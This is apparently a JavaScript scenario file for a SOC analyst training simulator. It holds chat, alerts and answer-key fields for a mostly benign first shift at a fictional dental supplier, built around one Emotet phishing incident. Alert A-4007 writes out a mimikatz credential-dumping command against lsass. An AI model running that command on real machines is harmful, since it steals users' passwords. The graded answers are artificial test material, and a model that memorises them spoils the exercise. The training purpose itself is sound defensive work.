    { at: '09:15', from: 'chidi', text: 'Reminder: the Tenable scan is running until 10:30 (CHG-5101). It will look noisy. The change calendar has the details.' },
    { at: '10:05', from: 'lena', text: 'Daily IOC digest is out. Nothing exciting, but there are fresh fake-invoice Emotet lures going around. Watch for .pdf.exe attachments.' },
    { at: '11:30', from: 'sam', text: 'FYI the Veeam backup on FS01 is chewing through the shares. Dev says it will finish around 12:30.' },
    { at: '12:50', from: 'tom', text: 'Lunch! Remember: if you are not sure about an alert, escalate it. Nobody gets in trouble for asking.' },
    { at: '14:10', from: 'chidi', text: 'Dev is doing the disk expansion on FS01 (CHG-5104), so you will see an admin RDP session. That is expected.' },
    { at: '15:00', from: 'dana', text: 'Good work today. Please finish your notes before handover at 16:00.' }
  ];

  const alerts = [
    {
      id: 'A-4001', at: '08:10', title: 'Account locked out after failed logons', severity: 'low', source: 'IAM', rule: 'IAM-009 Account lockout', hostId: 'h-hr-003', userId: 'u-hcole',
      summary: 'hcole was locked out after 2 failed logons on HR-LT-003, then a successful logon about 10 minutes later.',
      details: { 'Account': 'hcole', 'Host': 'HR-LT-003', 'Failure reason': 'Password expired (0xC0000071)', 'Failed logons': '2', 'Lockout': '07:55', 'Next successful logon': '08:05', 'Password reset': 'Yes, service desk ticket INC-30412' },
      eventIds: ['e-401', 'e-402', 'e-403', 'e-404', 'e-405'], iocs: [ioc('user', 'hcole'), ioc('host', 'HR-LT-003')], truth: 'FP',
      explain: 'The failures say "password expired", the only host is the user\'s own laptop, and the service desk reset the password (4724, INC-30412) before the successful logon.',
      reply: { fp: 'Password-expired lockout on his own laptop. The service desk reset it at 08:03 (INC-30412) and the logon worked at 08:05. Close it.' },
      keywords: ['hcole', 'lockout', 'expired', 'reset', 'inc-30412', '4724'],
      userReply: 'Yes, my password expired over the weekend and got locked. Sam on the service desk reset it for me.', helpdeskReply: 'Yep, I reset Henry\'s expired password at 08:03, ticket INC-30412. He verified his employee number.'
    },
    {
      id: 'A-4002', at: '08:42', title: 'First-ever logon for new account from unrecognized device', severity: 'low', source: 'IAM', rule: 'IAM-044 New account first logon', hostId: 'h-onb-019', userId: 'u-fgrant',
      summary: 'fgrant logged on for the first time ever from CSR-LT-019, a device not previously seen in the environment.',
      details: { 'Account': 'fgrant (created 08:21 today)', 'Host': 'CSR-LT-019', 'Logon type': '2 (Interactive)', 'Device seen before': 'No', 'Onboarding ticket': 'HR-ONB-2210' },
      eventIds: ['e-411', 'e-412', 'e-413', 'e-414'], iocs: [ioc('user', 'fgrant'), ioc('host', 'CSR-LT-019')], truth: 'FP',
      explain: 'Felix Grant is a new employee starting today. The account was created by the service desk under HR-ONB-2210 and the laptop was issued for him and enrolled in EDR/Intune.',
      reply: { fp: 'New hire starting today. Account created 08:21 by the service desk (HR-ONB-2210) and the laptop is his issued device. Close it.' },
      keywords: ['fgrant', 'new hire', 'onboarding', 'hr-onb-2210', 'first logon'],
      userReply: 'Hi! It is my first day. I just logged in to the laptop IT gave me.', helpdeskReply: 'Felix started today. I created his account and gave him CSR-LT-019, ticket HR-ONB-2210.'
    },
    {
      id: 'A-4003', at: '09:05', title: 'Internal network scan detected', severity: 'high', source: 'NDR', rule: 'NDR-221 Horizontal port scan', hostId: 'h-scan01',
      summary: 'Host 10.30.9.15 probed 96 internal hosts on ports 22/80/135/139/443/445/3389 in 6 minutes.',
      details: { 'Source': '10.30.9.15 (SCAN01, Tenable scanner)', 'Targets': '96 hosts', 'Ports': '22, 80, 135, 139, 443, 445, 3389', 'Duration': '6 min', 'Logon account': 'svc-tenable' },
      eventIds: ['e-421', 'e-422', 'e-423', 'e-424', 'e-425'], iocs: [ioc('ip', '10.30.9.15'), ioc('host', 'SCAN01')], truth: 'FP',
      explain: 'The scan source is SCAN01, our own Tenable server, running the approved monthly scan (CHG-5101, 08:30-10:30). It logged on with the scan service account svc-tenable.',
      reply: { fp: 'That is SCAN01, our Tenable scanner. The scan is on the change calendar as CHG-5101 and svc-tenable logged on at 08:31. Close as FP.' },
      keywords: ['scan', 'scan01', 'tenable', 'chg-5101', 'svc-tenable', '10.30.9.15']
    },
    {
      id: 'A-4004', at: '09:35', title: 'Large download from unfamiliar domain', severity: 'medium', source: 'Proxy', rule: 'PRX-071 Large inbound transfer', hostId: 'h-wh-002', userId: 'u-vramos',
      summary: 'WH-WS-002 downloaded 412 MB from tlu.dl.delivery.mp.microsoft.com, a domain with few prior hits.',
      details: { 'Domain': 'tlu.dl.delivery.mp.microsoft.com', 'Bytes in': '412 MB', 'Process': 'svchost.exe (wuauserv)', 'User': 'vramos', 'Category': 'Software Updates' },
      eventIds: ['e-431', 'e-432', 'e-433', 'e-434'], iocs: [ioc('domain', 'tlu.dl.delivery.mp.microsoft.com'), ioc('host', 'WH-WS-002')], truth: 'FP',
      explain: 'It is the Windows Update service (signed svchost.exe) fetching a monthly cumulative update from Microsoft\'s delivery network, followed by a Defender definitions update. Category is Software Updates.',
      reply: { fp: 'Windows Update. The process is the Microsoft-signed wuauserv service and the domain is Microsoft\'s update CDN. The Defender definitions updated right after. FP.' },
      keywords: ['windows update', 'microsoft', 'svchost', 'wuauserv', 'defender', 'signed'],
      userReply: 'I did not download anything. The PC said it was installing updates.'
    },
    {
      id: 'A-4005', at: '09:55', title: 'User-reported suspicious email', severity: 'low', source: 'Email GW', rule: 'MAIL-007 Report Phish button', hostId: 'h-mkt-005', userId: 'u-msingh',
      summary: 'msingh reported a message with subject "This week in dental supply: new sterilization guidelines".',
      details: { 'Sender': 'newsletter@prodentweekly.example', 'Recipient': 'msingh@brightsmile.test', 'Reported reason': 'too many marketing emails', 'SPF / DKIM / DMARC': 'pass / pass / pass', 'Attachments': '0' },
      eventIds: ['e-441', 'e-442', 'e-443', 'e-444'], iocs: [ioc('email', 'newsletter@prodentweekly.example'), ioc('domain', 'prodentweekly.example')], truth: 'FP',
      explain: 'A trade newsletter that Maya herself subscribed to in March. SPF, DKIM and DMARC all pass, the sender is on the allowlist, the sandbox found nothing, and the user just found it annoying.',
      reply: { fp: 'Bulk newsletter from a trade publication Maya subscribed to. SPF/DKIM/DMARC pass, sandbox clean, sender allowlisted. Not phishing, close it.' },
      keywords: ['newsletter', 'prodentweekly', 'spf', 'dkim', 'dmarc', 'subscription', 'clean'],
      userReply: 'Oh sorry, I get a lot of marketing mail. I guess I did sign up for that one. It just annoyed me.'
    },
    {
      id: 'A-4006', at: '10:14', title: 'Malware detected: Trojan.Win32.Emotet (quarantine failed)', severity: 'high', source: 'EDR', rule: 'EDR-0100 Known malware detection', hostId: 'h-acc-012', userId: 'u-gliu',
      summary: 'Invoice_8841.pdf.exe was detected as Trojan.Win32.Emotet on ACC-LT-012. Quarantine failed and the process is still running.',
      details: { 'File': 'C:\\Users\\gliu\\Downloads\\Invoice_8841\\Invoice_8841.pdf.exe', 'Detection': 'Trojan.Win32.Emotet (confidence 99%)', 'Launched by': 'gliu (explorer.exe)', 'Action': 'Quarantine FAILED, process running', 'Email sender': 'invoices@brightsmi1e.test (SPF fail, DMARC fail)', 'Contacted': 'secure-invoice-portal.test (203.0.113.66)', 'SHA256': MAL_SHA },
      eventIds: ['e-451', 'e-452', 'e-453', 'e-454', 'e-455', 'e-456', 'e-457'], iocs: [ioc('hash', MAL_SHA), ioc('domain', 'secure-invoice-portal.test'), ioc('ip', '203.0.113.66'), ioc('email', 'invoices@brightsmi1e.test'), ioc('host', 'ACC-LT-012'), ioc('user', 'gliu')], truth: 'TP', incident: 'INC-1',
      explain: 'TRUE POSITIVE. Grace got a fake invoice email that pretended to be the CEO from a lookalike domain (brightsmi1e with a number one, SPF/DMARC fail). She unzipped it and ran Invoice_8841.pdf.exe, a fake PDF (double extension). EDR names it Emotet, the quarantine failed, and it immediately contacted a malicious domain. Everything in the data points the same direction.',
      reply: { tp: 'Real one. Fake invoice from a lookalike domain, a .pdf.exe that EDR names as Emotet, quarantine failed, and it called out to a known-bad domain. I am taking this as an incident, do not touch the laptop.', irTp: 'Emotet dropper executed by the user, quarantine failed, C2 contact confirmed. I am isolating ACC-LT-012 now.' },
      keywords: ['emotet', 'invoice', 'pdf.exe', 'gliu', 'acc-lt-012', 'secure-invoice-portal', 'phish', 'spoofed'],
      userReply: 'I opened the invoice zip because it looked like it came from Elena. Nothing happened when I double-clicked the PDF, so I thought it was just broken. Did I do something wrong?',
      helpdeskReply: 'Grace called asking why an invoice PDF "did nothing". I told her to stop using the laptop and not to open anything else.'
    },
    {
      id: 'A-4007', at: '10:16', title: 'Credential dumping tool executed (mimikatz.exe)', severity: 'high', source: 'EDR', rule: 'EDR-0720 Credential dumping tool', hostId: 'h-acc-012', userId: 'u-gliu',
      summary: 'mimikatz.exe ran with sekurlsa::logonpasswords on ACC-LT-012 and opened lsass.exe, launched from a process chain that began with a malware detection.',
      details: { 'Process': 'C:\\Users\\Public\\mimikatz.exe', 'Command': 'privilege::debug sekurlsa::logonpasswords', 'Parent chain': 'Invoice_8841.pdf.exe > cmd.exe > mimikatz.exe', 'Target': 'lsass.exe (read memory)', 'Detection': 'HackTool.Win32.Mimikatz', 'User': 'CORP\\gliu' },
      eventIds: ['e-458', 'e-459', 'e-460', 'e-461', 'e-462', 'e-463'], iocs: [ioc('hash', MIMI_SHA), ioc('host', 'ACC-LT-012'), ioc('user', 'gliu'), ioc('ip', '203.0.113.66')], truth: 'TP', incident: 'INC-1',
      explain: 'TRUE POSITIVE (second alert of INC-1). A few minutes after the fake invoice ran, the malware downloaded Mimikatz and tried to steal passwords from memory. A normal accounts clerk never runs a tool like this, and it was started by the malware process.',
      reply: { tp: 'Same incident as the Emotet alert. The malware pulled down mimikatz and dumped LSASS, so assume Grace\'s credentials are stolen. Link this to the case.', irTp: 'Credential dumping after Emotet on ACC-LT-012. We will reset Grace\'s password and check for lateral movement.' },
      keywords: ['mimikatz', 'lsass', 'credential', 'dumping', 'acc-lt-012', 'gliu', 'emotet'],
      userReply: 'I do not know what mimikatz is. I only opened that invoice zip.'
    },
    {
      id: 'A-4008', at: '10:50', title: 'Possible ransomware: mass file access on file server', severity: 'critical', source: 'EDR', rule: 'EDR-0901 Ransomware behavior (mass file activity)', hostId: 'h-fs01',
      summary: '52,310 files per minute were read under D:\\Shares\\ by VeeamAgent.exe on FS01.',
      details: { 'Process': 'VeeamAgent.exe (signed, Veeam Software Group GmbH)', 'Account': 'CORP\\svc-veeam', 'Rate': '52,310 files/min', 'Path': 'D:\\Shares\\', 'Files modified': '0', 'Host criticality': 'High' },
      eventIds: ['e-471', 'e-472', 'e-473', 'e-474', 'e-475'], iocs: [ioc('host', 'FS01'), ioc('user', 'svc-veeam')], truth: 'FP',
      explain: 'It is the weekly Veeam backup (CHG-5103, 10:30). The files are only being READ: no writes, no renames, no new extensions, no ransom notes and no shadow copy deletion. Real ransomware modifies files.',
      reply: { fp: 'It is the approved Veeam weekly full backup (CHG-5103) run by svc-veeam. Reads only, nothing modified or renamed, no ransom notes. FP.' },
      keywords: ['veeam', 'backup', 'chg-5103', 'svc-veeam', 'read', 'fs01', 'no modification'],
      helpdeskReply: 'Dev told us the weekly backup on FS01 starts at 10:30 and runs until about 12:30, CHG-5103. Everything is normal.'
    },
    {
      id: 'A-4009', at: '11:20', title: 'Many failed VPN logons from one external IP', severity: 'medium', source: 'FW', rule: 'FW-063 VPN failed login burst', hostId: 'h-fw01',
      summary: '48 failed GlobalProtect VPN logins from 203.0.113.77 in 20 minutes using 12 different usernames.',
      details: { 'Source IP': '203.0.113.77', 'Failed logins': '48', 'Successful logins': '0', 'Usernames tried': '12 (admin, test, root...)', 'Valid directory users': '0', 'Lockouts': '0' },
      eventIds: ['e-481', 'e-482', 'e-483', 'e-484', 'e-485'], iocs: [ioc('ip', '203.0.113.77')], truth: 'FP',
      explain: 'Background internet noise. A known mass scanner guessed generic usernames (admin, test, root) that do not exist in the company directory. There were zero successful logins and no real accounts were locked out.',
      reply: { fp: 'Known internet scanner guessing generic usernames. 48 failures, 0 successes, 0 valid users, no lockouts. Block it if you like, but it is not a breach.' },
      keywords: ['vpn', '203.0.113.77', 'scanner', 'failed', 'no success', 'generic usernames']
    },
    {
      id: 'A-4010', at: '11:45', title: 'Device contacting unknown cloud domain', severity: 'low', source: 'NDR', rule: 'NDR-052 IoT rare destination', hostId: 'h-prn01',
      summary: 'OFC-PRN-01 made DNS queries and web requests to firmware.printworks-cloud.example, a domain not previously seen.',
      details: { 'Source': 'OFC-PRN-01 (10.30.3.50)', 'Domains': 'firmware.printworks-cloud.example, telemetry.printworks-cloud.example', 'Device type': 'Printer (PrintWorks MFP-C400)', 'User-Agent': 'PrintWorks-MFP/4.2', 'Bytes': '< 1 KB' },
      eventIds: ['e-491', 'e-492', 'e-493', 'e-494'], iocs: [ioc('domain', 'firmware.printworks-cloud.example'), ioc('host', 'OFC-PRN-01')], truth: 'FP',
      explain: 'The office copier is checking its vendor cloud for firmware updates and sending telemetry. The asset record shows it is a PrintWorks MFP with cloud firmware checks enabled; traffic is tiny.',
      reply: { fp: 'It is the office printer phoning home to its vendor (PrintWorks). The asset record matches the model and the traffic is tiny. FP.' },
      keywords: ['printer', 'printworks', 'firmware', 'iot', 'vendor', 'ofc-prn-01'],
      helpdeskReply: 'That is the copy room printer. It checks for firmware updates every day, that is normal.'
    },
    {
      id: 'A-4011', at: '12:20', title: 'Scheduled task created on web server', severity: 'medium', source: 'EDR', rule: 'EDR-0633 Scheduled task creation', hostId: 'h-web01',
      summary: 'A scheduled task \\Patching\\MonthlyInstall-2026-11 was created on WEB01 by svc-patch.',
      details: { 'Task': '\\Patching\\MonthlyInstall-2026-11', 'Created by': 'CORP\\svc-patch (parent ccmexec.exe)', 'Command': 'UsoClient.exe StartInstall', 'Planned restart': 'Yes, 12:14 (event 1074)' },
      eventIds: ['e-501', 'e-502', 'e-503', 'e-504'], iocs: [ioc('host', 'WEB01'), ioc('user', 'svc-patch')], truth: 'FP',
      explain: 'Thursday patching. CHG-5102 runs 12:00-13:00 on WEB01, the task was created by the patching service account svc-patch, runs the Windows update installer, and a planned restart was logged.',
      reply: { fp: 'Patch window CHG-5102 for WEB01, task made by svc-patch and it runs the Windows update client. Planned restart logged too. FP.' },
      keywords: ['scheduled task', 'patching', 'chg-5102', 'svc-patch', 'web01', 'usoclient']
    },
    {
      id: 'A-4012', at: '13:10', title: 'Sensitive data (SSN pattern) sent outside the company', severity: 'high', source: 'DLP', rule: 'DLP-210 PII to external recipient', hostId: 'h-hr-003', userId: 'u-hcole',
      summary: 'An email from hcole to payroll@paystream-hr.example contained 62 SSN-like values in payroll_Nov.xlsx.',
      details: { 'User': 'hcole', 'Recipient': 'payroll@paystream-hr.example', 'File': 'payroll_Nov.xlsx', 'Pattern matches': '62 SSN-like', 'Recipient category': 'Approved Data Processor', 'Transport': 'TLS enforced' },
      eventIds: ['e-511', 'e-512', 'e-513', 'e-514'], iocs: [ioc('email', 'payroll@paystream-hr.example'), ioc('user', 'hcole'), ioc('domain', 'paystream-hr.example')], truth: 'FP',
      explain: 'Henry sends the monthly payroll file to PayStream HR, the company\'s approved payroll processor (contract 2024-117). The recipient domain is on the Approved Data Processors list, the mail was sent over enforced TLS, and there is a recurring request REQ-7781.',
      reply: { fp: 'Monthly payroll file to PayStream HR, who are on the Approved Data Processors list (REQ-7781). Sent over enforced TLS. This is expected business. FP.' },
      keywords: ['payroll', 'paystream', 'dlp', 'approved', 'processor', 'req-7781', 'hcole'],
      userReply: 'Yes, that is the monthly payroll file to PayStream. I send it every month around this time.', helpdeskReply: 'Henry sends payroll to PayStream every month. They are the approved payroll vendor.'
    },
    {
      id: 'A-4013', at: '14:05', title: 'Administrator RDP logon to file server', severity: 'medium', source: 'SIEM', rule: 'AUTH-077 Admin RDP to server', hostId: 'h-fs01', userId: 'u-dkapoor',
      summary: 'dkapoor logged on to FS01 over RDP (logon type 10) with special privileges from IT-LT-004.',
      details: { 'Account': 'dkapoor (Systems Administrator)', 'Source': 'IT-LT-004 (10.30.9.44)', 'Target': 'FS01', 'Logon type': '10 (RemoteInteractive)', 'Command run': 'diskpart /s extend_d.txt' },
      eventIds: ['e-521', 'e-522', 'e-523', 'e-524'], iocs: [ioc('user', 'dkapoor'), ioc('host', 'FS01'), ioc('host', 'IT-LT-004')], truth: 'FP',
      explain: 'Dev Kapoor is the systems administrator and the approved change CHG-5104 (13:55-14:30) is exactly this: an RDP session to FS01 to extend the D: volume with diskpart.',
      reply: { fp: 'This is Dev, our sysadmin, doing the approved disk expansion on FS01 (CHG-5104). RDP from his laptop and he ran diskpart. FP.' },
      keywords: ['rdp', 'dkapoor', 'chg-5104', 'diskpart', 'fs01', 'admin'],
      userReply: 'Yep that is me extending the data drive on FS01, CHG-5104.'
    },
    {
      id: 'A-4014', at: '14:50', title: 'Repeated failed logons for a service account', severity: 'low', source: 'SIEM', rule: 'AUTH-021 Service account failed logons', hostId: 'h-web01',
      summary: 'svc-intranet had 3 failed logons on WEB01, then a successful logon at 14:44.',
      details: { 'Account': 'svc-intranet', 'Service': 'IntranetAppPool', 'Failure reason': 'Bad password (0xC000006A)', 'Failed logons': '3 (14:30-14:34)', 'Next success': '14:44', 'Related ticket': 'INC-30455' },
      eventIds: ['e-531', 'e-532', 'e-533', 'e-534', 'e-535'], iocs: [ioc('user', 'svc-intranet'), ioc('host', 'WEB01')], truth: 'FP',
      explain: 'The password for svc-intranet was rotated at 14:28 (INC-30455). The IIS app pool kept using the old password until its credential was updated at 14:43, then logons worked. Failures stop right after the update.',
      reply: { fp: 'Planned password rotation for svc-intranet (INC-30455). The app pool was still on the old password until 14:43, then it succeeded. FP.' },
      keywords: ['svc-intranet', 'service account', 'rotation', 'inc-30455', 'password', 'web01'],
      helpdeskReply: 'Dev rotated the svc-intranet password this afternoon, INC-30455. The intranet site hiccupped for a few minutes.'
    }
  ];

  window.SOC_SCENARIOS.push({
    id: 's4-easy-start', title: 'First Day on the Desk', tagline: 'A gentle, forgiving first shift. Most alerts have a simple, obvious explanation, so take your time and learn the routine.',
    difficulty: 'Easy', date: '2026-11-12', shift: { start: '08:00', end: '16:00' },
    company: { name: 'BrightSmile Dental Supply', domain: DOM, industry: 'Healthcare distribution', blurb: 'A friendly regional distributor of dental supplies with about 120 staff, one office, one warehouse and a small, well-run IT team.' },
    handover: 'Welcome to your first shift! The queue is usually calm on Thursdays.\nFor each alert: read the details first, then check the user and host, search the logs, look at the threat intel and the change calendar.\nThere is a Tenable scan, a Veeam backup, patching and a disk expansion planned today, so IT activity will look busy. Check the change calendar before worrying.\nA new hire (Felix Grant) starts today, and the service desk can confirm anything about accounts and laptops.\nIf you are not sure, escalate with a short note on who, which host, what you saw and why you think it is bad. Asking is always fine.',
    users, hosts, alerts, events, edr, intel, changes, chat
  });
})();
